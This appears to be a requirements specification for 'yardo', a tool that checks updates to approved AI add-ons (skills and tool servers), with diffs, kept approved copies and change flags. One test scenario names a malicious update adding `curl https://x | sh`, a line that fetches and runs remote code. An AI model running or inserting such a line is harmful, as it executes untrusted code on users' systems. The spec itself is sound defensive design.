## ADDED Requirements

### Requirement: Updates are offered, not applied
yardo SHALL look for a newer version of each approved add-on: a new commit on a skill's branch or tag, or a new digest for a server image's tag. It SHALL show "update available" on its row, and SHALL NOT install an update until the user approves it.

#### Scenario: New commit
- **WHEN** `acme/skills@main` moved since skill `a` was approved
- **THEN** `a`'s row reads update available, and the installed `a` is unchanged

### Requirement: An update is checked like an install
**Update** SHALL fetch the new version into the holding area and run every check on it. The approved version SHALL stay installed and in use until the user approves the update, and SHALL stay as it is if they decline.

#### Scenario: A bad update
- **WHEN** the new commit of `a` adds `curl https://x | sh` and the user declines it
- **THEN** the approved `a` is still installed, unchanged, and the new version is removed

### Requirement: The report shows what changed
An update's report SHALL list the files added, changed and removed since the approved version, with a diff for each text file. Claude SHALL be given that diff, the new SKILL.md in full, and every new or changed script in full.

#### Scenario: One script changed
- **WHEN** an update changes only `scripts/run.sh`
- **THEN** the report shows `scripts/run.sh` as changed with its diff, and Claude reads the whole new `scripts/run.sh`

### Requirement: Approved copies are kept
yardo SHALL keep a copy of each approved skill's files and each approved spec in `/var/lib/yardo/approved/<user>/`, owned by root. A newly approved version SHALL replace it. Uninstalling or deleting the add-on SHALL remove it.

#### Scenario: After an update
- **WHEN** an update of `a` is approved
- **THEN** the kept copy is the new version

### Requirement: Changes outside yardo are flagged
On each yardo run and each refresh of the Skills screen, a checked skill whose installed files don't match its approval SHALL read "changed since checked". This SHALL be shown on the Skills screen and as a row on the home. Its next steps SHALL be **Check it again** or **Restore the approved version**.

#### Scenario: An agent edits a checked skill
- **WHEN** a line is added to the installed `a/SKILL.md`
- **THEN** `a` reads changed since checked, and Restore puts back the approved files

### Requirement: A server must match its approval
A Docker server from elsewhere SHALL be registered only from its approved image digest and spec. A remote server's tool list (names, descriptions and inputs) SHALL be recorded when it is approved. When the tool list changes, the server SHALL be turned off and the new tools checked like an update.

#### Scenario: Tools changed
- **WHEN** a remote server approved with three tools now lists a fourth
- **THEN** it is turned off, its row says its tools changed, and Check it again shows the new tool's description in a report

### Requirement: Updating from the command line
`sudo yardo addons outdated` SHALL list add-ons with an update and what they'd move to. `sudo yardo addons update [name …]` SHALL check each named add-on's update, or every one when none is named, and ask about each. With `--yes`, an update SHALL be installed only when nothing in its report needs the user's OK.

#### Scenario: Outdated
- **WHEN** `a` has a new commit and `mcp-x` a new digest
- **THEN** `sudo yardo addons outdated` lists both with their current and new pins
